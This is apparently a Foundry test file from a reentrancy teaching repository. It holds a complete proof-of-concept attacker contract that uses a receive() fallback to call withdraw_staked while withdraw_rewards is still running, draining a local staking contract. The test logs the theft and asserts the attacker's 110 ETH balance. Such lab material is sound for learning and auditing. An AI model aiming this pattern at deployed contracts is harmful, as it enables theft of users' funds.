// SPDX-License-Identifier: MIT

/*
Call this contract from attacker
stake from attacker
attacker withdraw rewards
attacker withdraw staked

*/

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {staking} from "src/reentrancy/cross-function/staking.sol";

contract attacker {
    staking public target;
    bool public hasAttacked;

    constructor(address _target) {
        target = staking(payable(_target));
    }

    function depositandrun() external {
        target.stake{value: 100 ether}();
        target.withdraw_rewards();
    }

    receive() external payable {
        if (!hasAttacked) {
            hasAttacked = true;
            target.withdraw_staked();
        }
    }
}

contract cross_function_reentrancy is Test {
    staking public cf;
    attacker public exploit;

    function setUp() external {
        cf = new staking();
        exploit = new attacker(address(cf));
        vm.deal(address(exploit), 100 ether);
        vm.deal(address(cf), 50 ether);
    }

    function test_cross_function_reentrancy() public {
        (, uint256 stakedBefore, uint256 rewardsBefore, uint256 unlockBefore) = cf.users(address(exploit));
        console.log("Staked Before Attack:", stakedBefore / 1 ether, "ETH");
        console.log("Rewards Before Attack:", rewardsBefore / 1 ether, "ETH");
        console.log("Unlock Time Before Attack:", unlockBefore);
        console.log("Attacker Initial Balance:", address(exploit).balance / 1 ether, "ETH");
        console.log("---------------------------------------");
        exploit.depositandrun();

        (, uint256 stakedAfter, uint256 rewardsAfter, uint256 unlockAfter) = cf.users(address(exploit));
        console.log("---------------------------------------");
        console.log("Staked After Attack:", stakedAfter, "(Drained!)");
        console.log("Rewards Field in Contract:", rewardsAfter);
        console.log("Unlock Time Finalized To:", unlockAfter);
        console.log("Attacker Final Balance:", address(exploit).balance / 1 ether, "ETH");

        // Assert that the attacker successfully bypassed the lock and got all 110 ETH back
        assertEq(address(exploit).balance, 110 ether);
    }
}

